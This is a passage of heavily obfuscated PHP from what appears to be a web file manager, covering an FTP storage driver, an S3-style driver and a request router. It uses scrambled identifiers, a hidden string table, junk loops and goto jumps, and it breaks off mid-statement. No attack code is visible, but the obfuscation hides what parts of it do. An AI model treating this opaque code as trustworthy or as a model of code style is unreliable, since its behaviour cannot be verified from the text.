isset($Ãàúşó[$Ó¸¿òô€[209]]) ? $Ãàúşó[$Ó¸¿òô€[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Ó¸¿òô€[1608]) . $this->host . $Ó¸¿òô€[4] . $this->port, !0); return !1; } $©Ùõ½µĞ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$©Ùõ½µĞ) { $this->writeLog(LNG($Ó¸¿òô€[1609]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $Ó¸¿òô€[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $®î¿Ùª = $this->pasv == $Ó¸¿òô€[91] ? !0 : !1; @ftp_pasv($this->connect, $®î¿Ùª); $ëô…ƒİË[$ƒ’‰¨Ì…] = array($Ó¸¿òô€[1610] => $this->connect, $Ó¸¿òô€[208] => $this->host, $Ó¸¿òô€[207] => $this->scheme, $Ó¸¿òô€[209] => $this->port); return $©Ùõ½µĞ; } private function _isconn($ï¤Åç‚× = true) { if (is_resource($this->connect)) { return !0; } if (!$ï¤Åç‚×) { return !1; } return $this->_login($this->config); } public function mkfile($úÅ—ğîº, $×†±¶µ¾ = '', $öõ®¢Ÿâ = REPEAT_RENAME) { if ($this->setContent($úÅ—ğîº, $×†±¶µ¾)) { return $this->getPathOuter($úÅ—ğîº); } $this->writeLog(LNG($_SERVER[Ï×Œõ”û][1611]), !0); return !1; } public function mkdir($Åø«æƒ§, $ôöüÈë‚ = REPEAT_SKIP) { $öÍ§¯Ëü =& $_SERVER[Ï×Œõ”û]; if (!$Åø«æƒ§ || $Åø«æƒ§ == $öÍ§¯Ëü[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Åø«æƒ§ = $this->iconvSystem($Åø«æƒ§); if ($this->_isFolder($Åø«æƒ§) || @ftp_mkdir($this->connect, $Åø«æƒ§)) { return $this->getPathOuter($Åø«æƒ§); } if (!$this->mkdir($this->pathFather($Åø«æƒ§))) { return !1; } if ($Åø«æƒ§ = @ftp_mkdir($this->connect, $Åø«æƒ§)) { return $this->getPathOuter($Åø«æƒ§); } $ô‡»¹Š€ = __FUNCTION__ . $öÍ§¯Ëü[1612]; $this->writeLog($ô‡»¹Š€, !0); return !1; } public function copyFile($ÂÍ‘¼Ã, $çš¡ü¨) { if (!$this->_isconn()) { return !1; } $ü¢¤³Í = $this->pathThis($this->iconvSystem($ÂÍ‘¼Ã)); $úª¨ü˜˜ = $this->tempFile($ü¢¤³Í); $Ê¡İûæ = $this->iconvApp($úª¨ü˜˜); $this->download($ÂÍ‘¼Ã, $Ê¡İûæ); $çë˜Ò…¾ = $this->upload($çš¡ü¨, $Ê¡İûæ); $this->tempFileRemve($úª¨ü˜˜); return $çë˜Ò…¾; } public function moveFile($³ŠØºĞ…, $šò·º¡ê) { if (!$this->_isconn()) { return !1; } $³ŠØºĞ… = $this->iconvSystem($³ŠØºĞ…); $šò·º¡ê = $this->iconvSystem($šò·º¡ê); $Å©öÎğƒ = @ftp_rename($this->connect, $³ŠØºĞ…, $šò·º¡ê); if (!$Å©öÎğƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } return $this->getPathOuter($šò·º¡ê); } public function delFile($ª­­×Ù×) { if (!$this->_isconn()) { return !1; } $ª­­×Ù× = $this->iconvSystem($ª­­×Ù×); $ñ¸×”®õ = @ftp_delete($this->connect, $ª­­×Ù×); if (!$ñ¸×”®õ) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); } return $ñ¸×”®õ; } public function delFolder($®ƒı) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $ïíìÖŸ = $ÔğïèŞâ = array(); $this->fileList($®ƒı, $ïíìÖŸ, $ÔğïèŞâ, !0); $this->listItemCache = !0; foreach ($ÔğïèŞâ as $îñıÓÕÙ) { $€ÄÃØ— = $this->iconvSystem($îñıÓÕÙ[$_SERVER[Ï×Œõ”û][32]]); $×Ï¹®Ş = @ftp_delete($this->connect, $€ÄÃØ—); if (!$×Ï¹®Ş) { return !1; } } foreach ($ïíìÖŸ as $€ÄÃØ—) { $€ÄÃØ— = $this->iconvSystem($€ÄÃØ—); $×Ï¹®Ş = @ftp_rmdir($this->connect, $€ÄÃØ—); if (!$×Ï¹®Ş) { return !1; } } $®ƒı = $this->iconvSystem($®ƒı); return @ftp_rmdir($this->connect, $®ƒı); } public function rename($¢ºñ›ÔÃ, $×¡È¢ñÊ) { $Ğİ¦’à =& $_SERVER[Ï×Œõ”û]; if (!$this->_isconn()) { return !1; } $šĞÖøÚ = $this->fileNameAuto($this->pathFather($¢ºñ›ÔÃ), $×¡È¢ñÊ); $šĞÖøÚ = $this->iconvSystem($šĞÖøÚ); $¢ºñ›ÔÃ = $this->iconvSystem($¢ºñ›ÔÃ); $»Ì…Ç¯ç = $this->pathFather($¢ºñ›ÔÃ); $İŒÅºíÒ = rtrim($»Ì…Ç¯ç, $Ğİ¦’à[8]) . $Ğİ¦’à[8] . $šĞÖøÚ; $¿ƒé€¹ = @ftp_rename($this->connect, $¢ºñ›ÔÃ, $İŒÅºíÒ); if (!$¿ƒé€¹) { $this->writeLog(__FUNCTION__ . $Ğİ¦’à[1612], !0); return !1; } $İŒÅºíÒ = $this->iconvApp($İŒÅºíÒ); return $this->getPathOuter($İŒÅºíÒ); } private function folderInfo($Àê Ø›, $ëÕòìË¹ = false) { $ÑÍêµ¨± =& $_SERVER[Ï×Œõ”û]; $ñ‡š÷¸ = array($ÑÍêµ¨±[32] => $this->pathThis($Àê Ø›), $ÑÍêµ¨±[87] => $this->getPathOuter($ÑÍêµ¨±[8] . $Àê Ø›), $ÑÍêµ¨±[33] => $ÑÍêµ¨±[78]); if ($ëÕòìË¹) { return $ñ‡š÷¸; } $ñ‡š÷¸[$ÑÍêµ¨±[233]] = $ñ‡š÷¸[$ÑÍêµ¨±[88]] = 0; $ñ‡š÷¸[$ÑÍêµ¨±[234]] = $ñ‡š÷¸[$ÑÍêµ¨±[235]] = !0; return $ñ‡š÷¸; } private function fileInfo($¾Œ‰éˆ×, $ÎÎ…Ÿ“± = false, $”ıó‘Œ³ = array()) { $¡ÆÒæ› =& $_SERVER[Ï×Œõ”û]; $”Ï“Ä”« = array($¡ÆÒæ›[32] => $this->pathThis($¾Œ‰éˆ×), $¡ÆÒæ›[87] => $this->getPathOuter($¡ÆÒæ›[8] . $¾Œ‰éˆ×), $¡ÆÒæ›[33] => $¡ÆÒæ›[232], $¡ÆÒæ›[79] => isset($”ıó‘Œ³[$¡ÆÒæ›[79]]) ? $”ıó‘Œ³[$¡ÆÒæ›[79]] : 0, $¡ÆÒæ›[168] => $this->ext($¾Œ‰éˆ×)); if ($ÎÎ…Ÿ“±) { return $”Ï“Ä”«; } $”Ï“Ä”«[$¡ÆÒæ›[233]] = $”Ï“Ä”«[$¡ÆÒæ›[88]] = 0; $”Ï“Ä”«[$¡ÆÒæ›[234]] = $”Ï“Ä”«[$¡ÆÒæ›[235]] = !0; $‰¶¶öÂ‰ = $this->iconvSystem($¾Œ‰éˆ×); $”Ï“Ä”«[$¡ÆÒæ›[88]] = @ftp_mdtm($this->connect, $‰¶¶öÂ‰); if (empty($”ıó‘Œ³)) { $”ıó‘Œ³ = $this->objectMeta($¾Œ‰éˆ×); if (!$”ıó‘Œ³) { return $”Ï“Ä”«; } } $”Ï“Ä”«[$¡ÆÒæ›[79]] = $”ıó‘Œ³[$¡ÆÒæ›[79]]; return $”Ï“Ä”«; } public function size($„Ñ°éö€) { $‘ŒÙ¾”é = $this->objectMeta($„Ñ°éö€); return $‘ŒÙ¾”é ? $‘ŒÙ¾”é[$_SERVER[Ï×Œõ”û][79]] : 0; } public function info($Š’œ¼üÄ) { if ($this->isFile($Š’œ¼üÄ)) { return $this->fileInfo($Š’œ¼üÄ, 0); } else { if ($this->isFolder($Š’œ¼üÄ)) { return $this->folderInfo($Š’œ¼üÄ); } } return !1; } private function fileList($‹íÄÂ¡½, &$ì¡ËÛå˜, &$ß”¦¶¥¼, $²ÍòÜ€ = false) { $°ìÌÄ =& $_SERVER[Ï×Œõ”û]; $‹íÄÂ¡½ = $this->iconvSystem($‹íÄÂ¡½); if (!$this->isFolder($‹íÄÂ¡½)) { return !1; } $‹íÄÂ¡½ = rtrim($‹íÄÂ¡½, $°ìÌÄ[8]) . $°ìÌÄ[8]; check_abort(); $Ÿ¦Â¡î  = @ftp_rawlist($this->connect, $‹íÄÂ¡½); if (!$Ÿ¦Â¡î ) { $Ÿ¦Â¡î  = array(); } $ùòÏæ¯¯ = array($°ìÌÄ[10] => 1, $°ìÌÄ[1422] => 1); foreach ($Ÿ¦Â¡î  as $³Ó¢¾ä) { $²ª«§â‘ = $this->_listItem($³Ó¢¾ä); if ($²ª«§â‘[0] == $°ìÌÄ[865]) { continue; } $–œ••À = $²ª«§â‘[8]; if (empty($–œ••À) && $–œ••À !== $°ìÌÄ[230] || isset($ùòÏæ¯¯[$–œ••À])) { continue; } $–œ••À = $this->iconvApp($‹íÄÂ¡½ . ltrim($–œ••À, $°ìÌÄ[8])); $¸›¿ò‚ø = array($°ìÌÄ[32] => $–œ••À, $°ìÌÄ[33] => $°ìÌÄ[232], $°ìÌÄ[79] => $²ª«§â‘[4]); if (substr($³Ó¢¾ä, 0, 1) == $°ìÌÄ[1613]) { $¸›¿ò‚ø[$°ìÌÄ[33]] = $°ìÌÄ[78]; $¸›¿ò‚ø[$°ìÌÄ[79]] = 0; } $Üš¤­Í = $¸›¿ò‚ø[$°ìÌÄ[33]] == $°ìÌÄ[78] ? !0 : !1; $this->cacheMethodInfoSet($–œ••À, $Üš¤­Í, $¸›¿ò‚ø); if ($Üš¤­Í) { $ì¡ËÛå˜[] = $–œ••À; if ($²ÍòÜ€) { $this->fileList($–œ••À, $ì¡ËÛå˜, $ß”¦¶¥¼, $²ÍòÜ€); } continue; } $ß”¦¶¥¼[] = $¸›¿ò‚ø; } $this->cacheMethodInfoSet($‹íÄÂ¡½, !0); } private function _listItem($™şÀğ‰) { if (empty($™şÀğ‰)) { return array(); } $”‚¯ã¨˜ = preg_split($_SERVER[Ï×Œõ”û][1614], $™şÀğ‰); if (count($”‚¯ã¨˜) <= 9) { return $”‚¯ã¨˜; } $”‚¯ã¨˜[8] = trim(substr($™şÀğ‰, strpos($™şÀğ‰, $”‚¯ã¨˜[7]) + strlen($”‚¯ã¨˜[7]))); return array_splice($”‚¯ã¨˜, 0, 9); } public function listPath($Œó¬¬—, $ÅóÓÒÌ® = false) { $Ã÷Æ»‘² =& $_SERVER[Ï×Œõ”û]; if (!$this->_isconn()) { return !1; } $’Ë·î = $ˆùê„Ô÷ = array(); $this->fileList($Œó¬¬—, $’Ë·î, $ˆùê„Ô÷); foreach ($’Ë·î as $Êí‘Ôôá => $¶›˜ì«É) { $’Ë·î[$Êí‘Ôôá] = $this->folderInfo($¶›˜ì«É, $ÅóÓÒÌ®); } foreach ($ˆùê„Ô÷ as $Êí‘Ôôá => $¶›˜ì«É) { $ˆùê„Ô÷[$Êí‘Ôôá] = $this->fileInfo($¶›˜ì«É[$Ã÷Æ»‘²[32]], $ÅóÓÒÌ®, $¶›˜ì«É); } return array($Ã÷Æ»‘²[85] => $’Ë·î, $Ã÷Æ»‘²[86] => $ˆùê„Ô÷); } public function has($¶ä’ Ş°, $¡úÔá¡ã = false, $íéÜÁ† = true) { $½Ãˆƒ =& $_SERVER[Ï×Œõ”û]; $°£ëÙô = $»´Ê¥¹ = array(); $´š×ôâ³ = $¡úÔá¡ã ? !0 : !1; $this->fileList($¶ä’ Ş°, $°£ëÙô, $»´Ê¥¹, $´š×ôâ³); if ($¡úÔá¡ã) { return array($½Ãˆƒ[241] => count($»´Ê¥¹), $½Ãˆƒ[242] => count($°£ëÙô)); } if ($íéÜÁ†) { if (count($»´Ê¥¹)) { return !0; } } else { if (count($°£ëÙô)) { return !0; } } return !1; } public function listAll($’©·×Êı) { $Úşó€å§ =& $_SERVER[Ï×Œõ”û]; if (!$this->_isconn()) { return !1; } $èí¤³¯Ñ = $¨×äìÎä = array(); $this->fileList($’©·×Êı, $èí¤³¯Ñ, $¨×äìÎä, !0); $³‹ÎŒ…® = array_to_keyvalue($¨×äìÎä, $Úşó€å§[32]); foreach ($èí¤³¯Ñ as $§ĞºËØ¬) { if (is_string($§ĞºËØ¬)) { $³‹ÎŒ…®[$§ĞºËØ¬] = array($Úşó€å§[79] => 0); } } return $this->listAllFiles($’©·×Êı, $³‹ÎŒ…®); } public function getContent($÷˜®‘Õ) { if (!$this->_isconn()) { return !1; } $÷˜®‘Õ = $this->iconvSystem($÷˜®‘Õ); return $this->fileSubstr($÷˜®‘Õ); } public function setContent($¤‚¤´íÒ, $ ÁˆŸ‹ = '') { if (!$this->_isconn()) { return !1; } $ŠÂ—£¸ = $this->pathThis($this->iconvSystem($¤‚¤´íÒ)); $Í¬æøì‚ = $this->tempFile($ŠÂ—£¸); file_put_contents($Í¬æøì‚, $ ÁˆŸ‹); $›ñÙÓè¢ = $this->upload($¤‚¤´íÒ, $this->iconvApp($Í¬æøì‚)); $this->tempFileRemve($Í¬æøì‚); return $›ñÙÓè¢; } public function fileSubstr($ŒÅ›ÖË×, $â•îŒ©Ö = 0, $İğ½ûàÁ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ŒÅ›ÖË×, $â•îŒ©Ö, $İğ½ûàÁ); } private function ftpRequest($×Ã„¯¯†, $Ö¹ÔÀ™÷ = 0, $ƒ’ùµƒ = false) { $¾°¯¹šÚ =& $_SERVER[Ï×Œõ”û]; $×Ã„¯¯† = $¾°¯¹šÚ[8] . ltrim(str_ltrim($×Ã„¯¯†, $this->ftpPath), $¾°¯¹šÚ[8]); $×Ã„¯¯† = $this->iconvSystem($×Ã„¯¯†); $€¶É»‘£ = $this->scheme . $this->host . $¾°¯¹šÚ[4] . $this->port; $¬ºøº¾… = curl_init(); curl_setopt($¬ºøº¾…, CURLOPT_URL, $€¶É»‘£ . $this->pathEncode($×Ã„¯¯†)); curl_setopt($¬ºøº¾…, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($ƒ’ùµƒ) { $Æ´ÙÛôò = $Ö¹ÔÀ™÷ + $ƒ’ùµƒ - 1; curl_setopt($¬ºøº¾…, CURLOPT_RANGE, "{$Ö¹ÔÀ™÷}\55{$Æ´ÙÛôò}"); } curl_setopt($¬ºøº¾…, CURLOPT_RETURNTRANSFER, 1); $¼Š»¢Ï­ = curl_exec($¬ºøº¾…); curl_close($¬ºøº¾…); return $¼Š»¢Ï­; } public function upload($±ÆÁ€”ª, $™§“Ñ—€, $‡‚ö©÷è = false, $¼ºãÃäí = REPEAT_REPLACE) { if (!$™§“Ñ—€ || !@file_exists($™§“Ñ—€)) { return !1; } if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($±ÆÁ€”ª))) { return !1; } $±ÆÁ€”ª = $this->iconvSystem($±ÆÁ€”ª); $™§“Ñ—€ = $this->iconvSystem($™§“Ñ—€); $òÕ‹Îá• = ftp_nb_put($this->connect, $±ÆÁ€”ª, $™§“Ñ—€, FTP_BINARY); while ($òÕ‹Îá• == FTP_MOREDATA) { $òÕ‹Îá• = ftp_nb_continue($this->connect); } if ($òÕ‹Îá• != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } return $this->getPathOuter($±ÆÁ€”ª); } public function download($¨ıÖÉÀ€, $ƒ€îùç = '') { if (!$this->_isconn()) { return !1; } $¶’’ôËÀ = $this->pathFather($ƒ€îùç); if (!IO::mkdir($¶’’ôËÀ)) { return !1; } $¨ıÖÉÀ€ = $this->iconvSystem($¨ıÖÉÀ€); $ƒ€îùç = $this->iconvSystem($ƒ€îùç); $³¾ïÕÙ = ftp_nb_get($this->connect, $ƒ€îùç, $¨ıÖÉÀ€, FTP_BINARY); while ($³¾ïÕÙ == FTP_MOREDATA) { $³¾ïÕÙ = ftp_nb_continue($this->connect); } if ($³¾ïÕÙ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[Ï×Œõ”û][1612], !0); return !1; } return $this->iconvApp($ƒ€îùç); } public function exist($»èÄ°®è) { return $this->isFile($»èÄ°®è) || $this->isFolder($»èÄ°®è); } public function isFile($ıàÅå–Î) { return !$this->isFolder($ıàÅå–Î) && $this->objectMeta($ıàÅå–Î); } public function isFolder($øĞ†Í‘®) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][179], $øĞ†Í‘®); } protected function objectMeta($Ú”–‰¶²) { return $this->cacheMethod($_SERVER[Ï×Œõ”û][181], $Ú”–‰¶²); } protected function _objectMeta($¼¯†šËÜ) { $–Ğ¾“…Ÿ =& $_SERVER[Ï×Œõ”û]; if ($¼¯†šËÜ == $–Ğ¾“…Ÿ[12] || $¼¯†šËÜ == $–Ğ¾“…Ÿ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $¼¯†šËÜ = $this->iconvSystem($¼¯†šËÜ); $Ä’Ûû¡Â = array($–Ğ¾“…Ÿ[32] => $this->iconvApp($¼¯†šËÜ), $–Ğ¾“…Ÿ[33] => $–Ğ¾“…Ÿ[232], $–Ğ¾“…Ÿ[79] => 0); $Ô²äÀ…Œ = @ftp_size($this->connect, $¼¯†šËÜ); if ($Ô²äÀ…Œ != -1) { $Ä’Ûû¡Â[$–Ğ¾“…Ÿ[79]] = $Ô²äÀ…Œ; } else { $îÙÉ„úÍ = @ftp_chdir($this->connect, $¼¯†šËÜ); if (!$îÙÉ„úÍ) { return !1; } @ftp_chdir($this->connect, $–Ğ¾“…Ÿ[8]); $Ä’Ûû¡Â[$–Ğ¾“…Ÿ[33]] = $–Ğ¾“…Ÿ[78]; } return $Ä’Ûû¡Â; } protected function _isFolder($Ù°éã¤…) { $«Çß™ =& $_SERVER[Ï×Œõ”û]; if ($Ù°éã¤… == $«Çß™[12] || $Ù°éã¤… == $«Çß™[8]) { return !0; } $ûØãºÜ‡ = $this->_objectMeta($Ù°éã¤…); return isset($ûØãºÜ‡[$«Çß™[33]]) && $ûØãºÜ‡[$«Çß™[33]] == $«Çß™[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Î¤ÚÁô) { parent::__construct($Î¤ÚÁô); $this->setSignVersion($_SERVER[Ï×Œõ”û][249]); } public function uploadLink($«›º÷©®, $Ñ•ÙËÑÍ = 0) { $´™‘º®æ =& $_SERVER[Ï×Œõ”û]; if ($this->isUploadServer()) { return; } $ïÕõÚ› = $this->getType(); if (!in_array($ïÕõÚ›, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‰éÈÍÒ– = (!$Ñ•ÙËÑÍ ? 1 : ceil($Ñ•ÙËÑÍ / pow(1024, 3))) * 3600 * 4; $ğÔ¿˜×¿ = $this->uploadMultiData($«›º÷©®, $‰éÈÍÒ–); if ($ğÔ¿˜×¿) { $ğÔ¿˜×¿[$´™‘º®æ[95]] = $«›º÷©®; $ğÔ¿˜×¿[$´™‘º®æ[96]] = $ïÕõÚ›; } return $ğÔ¿˜×¿; } public function fileOutImage($Ğà±æ˜¹, $ÜÅ‰ÖÓ† = 250) { if ($this->size($Ğà±æ˜¹) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ğà±æ˜¹, $ÜÅ‰ÖÓ†); } $¯”‰ñ‡Ä = $this->link($Ğà±æ˜¹); $¯”‰ñ‡Ä .= $_SERVER[Ï×Œõ”û][1615] . $ÜÅ‰ÖÓ†; $this->fileOutLink($¯”‰ñ‡Ä); } } goto BËœê¨íé; fò®Ş¶É½: $ajsqezbgcp = $_SERVER[Ï×Œõ”û][710]; while (strlen($ajsqezbgcp) < $_SERVER[Ï×Œõ”û][711]) { if (!$ajsqezbgcp) { break; } $ajsqezbgcp++; } class Application { private $defaultModule = "\151\x6e\x64\x65\x78"; private $defaultController = "\151\156\144\145\x78"; private $defaultAction = "\x69\x6e\144\x65\x78"; function __construct() { } public function setDefault($”´Ñ†ë) { $÷é¯ñø =& $_SERVER[É‹íîÃÊ]; $Õ‚Ñò„Ö = explode($÷é¯ñø[0], trim($”´Ñ†ë, $÷é¯ñø[0])); $this->defaultModule = $Õ‚Ñò„Ö[0] ? $Õ‚Ñò„Ö[0] : $this->defaultModule; $this->defaultController = $Õ‚Ñò„Ö[1] ? $Õ‚Ñò„Ö[1] : $this->defaultController; $this->defaultAction = $Õ‚Ñò„Ö[2] ? $Õ‚Ñò„Ö[2] : $this->defaultAction; $¾¡ì½¡µ = $_SERVER[Ï×Œõ”û][712]; $this->myko60a1b771($÷é¯ñø[1], array($this, $÷é¯ñø[2])); } public function appRun($İ†ô–ıñ) { $ÖùØô†” =& $_SERVER[Ï×Œõ”û]; $Ã¨‚¯Û =& $_SERVER[É‹íîÃÊ]; $®­‡€Âõ = explode($Ã¨‚¯Û[0], $İ†ô–ıñ); $¾®é¯ = $ÖùØô†”[713]; if (strlen($¾®é¯) < $ÖùØô†”[711]) { return; } $ÉÁöÆ²ñ = strtolower($®­‡€Âõ[0]); $Ûï§™¾ = $Ã¨‚¯Û[3]; $©Øæãà = $ÖùØô†”[714]; if (!$©Øæãà) { die; } if ($ÉÁöÆ²ñ == $Ã¨‚¯Û[4]) { $Ûï§™¾ = $Ã¨‚¯Û[5]; $®­‡€Âõ[0] = $Ã¨‚¯Û[6]; $®­‡€Âõ[1] = $®­‡€Âõ[1] . $Ã¨‚¯Û[7]; $İ†ô–ıñ = join($Ã¨‚¯Û[0], $®­‡€Âõ); $İ†ô–ıñ = trim($İ†ô–ıñ, $Ã¨‚¯Û[0]); } call_user_func(array($Ã¨‚¯Û[8], $Ã¨‚¯Û[9]), $Ûï§™¾ . $Ã¨‚¯Û[10], $İ†ô–ıñ); ActionCall($İ†ô–ıñ); $Ëºº…Ş” = $ÖùØô†”[715]; if (strlen($Ëºº…Ş”) < $ÖùØô†”[716]) { die; } call_user_func(array($Ã¨‚¯Û[8], $Ã¨‚¯Û[9]), $Ûï§™¾ . $Ã¨‚¯Û[11], $İ†ô–ıñ); } private function autorun() { $ˆ³‹®éˆ =& $_SERVER[Ï×Œõ”û]; $ˆõİ¿ïÁ =& $_SERVER[É‹íîÃÊ]; global $config; if (count($config[$ˆõİ¿ïÁ[12]]) == 0) { return; } foreach ($config[$ˆõİ¿ïÁ[12]] as $‘íƒ³÷í => $©óË‡Æ—) { $this->appRun($©óË‡Æ—); $ÄÙ³ÃÏ’ = $ˆ³‹®éˆ[717]; if (strlen($ÄÙ³ÃÏ’) < $ˆ³‹®éˆ[493]) { die; } } } private function icmu419ebf75() { $ÁÙ°Ÿ¢ =& $_SERVER[Ï×Œõ”û]; $õ¬—Õôœ =& $_SERVER[É‹íîÃÊ]; $ı÷˜»¬á = $õ¬—Õôœ[4]; $ó¬Í´ß‚ = $GLOBALS[$õ¬—Õôœ[13]][$õ¬—Õôœ[14]][0]; $òïÈÙ€ = $ÁÙ°Ÿ¢[718]; if (strlen($òïÈÙ€) < $ÁÙ°Ÿ¢[719]) { return; } if (!$ó¬Í´ß‚ || strlen($ó¬Í´ß‚) <= strlen($ı÷˜»¬á)) { return; } if (strtolower(substr($ó¬Í´ß‚, -strlen($ı÷˜»¬á))) != $ı÷˜»¬á) { return; } $øœöãì = substr($ó¬Í´ß‚, 0, -strlen($ı÷˜»¬á)); $¥œˆ¼´Ú = $ÁÙ°Ÿ¢[720]; if (!$¥œˆ¼´Ú) { return; } $üËÇªùù = array($õ¬—Õôœ[4], $øœöãì); $ø·¡£á° = $ÁÙ°Ÿ¢[721]; while ($ø·¡£á° < $ÁÙ°Ÿ¢[722]) { if ($ø·¡£á° >= 0) { break; } $ø·¡£á°++; } $â˜›üæŒ = array_slice($GLOBALS[$õ¬—Õôœ[13]][$õ¬—Õôœ[14]], 1); $GLOBALS[$õ¬—Õôœ[13]][$õ¬—Õôœ[14]] = array_merge($üËÇªùù, $â˜›üæŒ); $GLOBALS[$õ¬—Õôœ[13]][$õ¬—Õôœ[15]] = implode($õ¬—Õôœ[0], $GLOBALS[$õ¬—Õôœ[13]][$õ¬—Õôœ[14]]); } private function tjpd995495f7() { $éÔı¼á² =& $_SERVER[Ï×Œõ”û]; $ÑóÔË¾ó =& $_SERVER[É‹íîÃÊ]; if ($GLOBALS[$ÑóÔË¾ó[13]][$ÑóÔË¾ó[15]] != $ÑóÔË¾ó[6]) { return; } $ãû„–±ò = $_SERVER[$ÑóÔË¾ó[16]]; $ï± Ğ±ƒ = $ÑóÔË¾ó[17]; $Âé®‡…· = $éÔı¼á²[723]; while (strlen($Âé®‡…·) < $éÔı¼á²[493]) { if (!$Âé®‡…·) { break; } $Âé®‡…·++; } if (!strstr($ãû„–±ò, $ï± Ğ±ƒ)) { return; } $ŞĞ¯™²ú = strrpos($ãû„–±ò, $ï± Ğ±ƒ); $¥ö–˜†¤ = $éÔı¼á²[724]; $»¥œ­ˆÌ = substr($ãû„–±ò, $ŞĞ¯™²ú + strlen($ï± Ğ±ƒ)); preg_match_all($ÑóÔË¾ó[18], $»¥œ­ˆÌ, $Ó„Ë±Ëë); $ñˆœ°Í = $éÔı¼á²[725]; $»¥œ­ˆÌ = trim($Ó„Ë±Ëë[0][0], $ÑóÔË¾ó[19]); $ÔìÁ£± = $éÔı¼á²[726]; if (!$ÔìÁ£±) { return; } $GLOBALS[$ÑóÔË¾ó[13]][$ÑóÔË¾ó[14]] = explode($ÑóÔË¾ó[19], $»¥œ­ˆÌ); $GLOBALS[$ÑóÔË¾ó[13]][$ÑóÔË¾ó[15]] = implode($ÑóÔË¾ó[0], $GLOBALS[$ÑóÔË¾ó[13]][$ÑóÔË¾ó[14]]); } public function run() { $Ø·¬“İ¶ =& $_SERVER[Ï×Œõ”û]; $èóÀİ¹¬ =& $_SERVER[É‹íîÃÊ]; $this->tjpd995495f7(); $ØƒµÔÕ» = $Ø·¬“İ¶[727]; while ($ØƒµÔÕ» < $Ø·¬“İ¶[716]) { if ($ØƒµÔÕ» >= 0) { break; } $ØƒµÔÕ»++; } $this->icmu419ebf75(); $ÎŒÊ¼Ñ» = $GLOBALS[$èóÀİ¹¬[13]][$èóÀİ¹¬[14]]; $Á¹éî¦± = $GLOBALS[$èóÀİ¹¬[13]][$èóÀİ¹¬[15]]; define($èóÀİ¹¬[20], isset($ÎŒÊ¼Ñ»[0]) && $ÎŒÊ¼Ñ»[0] ? $ÎŒÊ¼Ñ»[0] : $this->defaultModule); define($èóÀİ¹¬[21], isset($ÎŒÊ¼Ñ»[1]) && $ÎŒÊ¼Ñ»[0] ? $ÎŒÊ¼Ñ»[1] : $this->defaultController); $½ñº†‰¼ = $Ø·¬“İ¶[728]; define($èóÀİ¹¬[22], isset($ÎŒÊ¼Ñ»[2]) && $ÎŒÊ¼Ñ»[0] ? $ÎŒÊ¼Ñ»[2] : $this->defaultAction); define($èóÀİ¹¬[23], MOD . $èóÀİ¹¬[0] . ST . $èóÀİ¹¬[0] . ACT); $_SERVER[$èóÀİ¹¬[24]] = strtolower(ACTION); $Šİ®„ş· = $Ø·¬“İ¶[729]; while ($Šİ®„ş· < $Ø·¬“İ¶[716]) { if ($Šİ®„ş· >= 0) { break; } $Šİ®„ş·++; } $this->autorun(); $ùÕü·Û¬ = $Ø·¬“İ¶[730]; while ($ùÕü·Û¬ < $Ø·¬“İ¶[722]) { if ($ùÕü·Û¬ >= 0) { break; } $ùÕü·Û¬++; } if (count($ÎŒÊ¼Ñ») >= 3) { $this->appRun($Á¹éî¦±); } else { $this->appRun(ACTION); } } private $dykna2511562 = array(); private $bxpnfb55515a = ''; public function iatm356d8c64() { $‘÷ŠÓ»‘ =& $_SERVER[Ï×Œõ”û]; $÷û³éÕÜ =& $_SERVER[É‹íîÃÊ]; $this->nfij13a4b833(); $this->aouzd78644c0(); $this->geqoc21e4947(); $ò»„‘Ö = $‘÷ŠÓ»‘[731]; if (strlen($ò»„‘Ö) < $‘÷ŠÓ»‘[722]) { return; } $this->ygvi70d7185b(); $this->uhswb48618ad(); $this->svhe2f476a87(); $«é‰ùàí = $‘÷ŠÓ»‘[732]; if (!$«é‰ùàí) { die; } $this->wjsqe628daae(); $óí¸ìá = $‘÷ŠÓ»‘[733]; if (strlen($óí¸ìá) < $‘÷ŠÓ»‘[716]) { die; } $this->myko60a1b771($÷û³éÕÜ[25], array($this, $÷û³éÕÜ[26])); $this->myko60a1b771($÷û³éÕÜ[27], array($this, $÷û³éÕÜ[28])); $this->myko60a1b771($÷û³éÕÜ[29], array($this, $÷û³éÕÜ[30])); $Í—ÛÅñ› = $‘÷ŠÓ»‘[734]; $this->myko60a1b771($÷û³éÕÜ[31], array($this, $÷û³éÕÜ[32])); } public function getVersionData() { return $this->dykna2511562; $’‚ñ¥½ñ = $_SERVER[Ï×Œõ”û][735]; if (!$’‚ñ¥½ñ) { die; } } public function wmcv4ba15c83($À¡§ Òí) { $ì¥İ—–› =& $_SERVER[Ï×Œõ”û]; $îÏ±…Ó =& $_SERVER[É‹íîÃÊ]; $ù·Ø²ˆú = Model($îÏ±…Ó[33])->get(); $õ¥“Ğòë = array($îÏ±…Ó[34], $îÏ±…Ó[35], $îÏ±…Ó[36], $îÏ±…Ó[37], $îÏ±…Ó[38], $îÏ±…Ó[39], $îÏ±…Ó[40], $îÏ±…Ó[41], $îÏ±…Ó[42], $îÏ±…Ó[43], $îÏ±…Ó[44], $îÏ±…Ó[45], $îÏ±…Ó[46], $îÏ±…Ó[47], $îÏ±…Ó[48], $îÏ±…Ó[49], $îÏ±…Ó[50], $îÏ±…Ó[51], $îÏ±…Ó[52], $îÏ±…Ó[53], 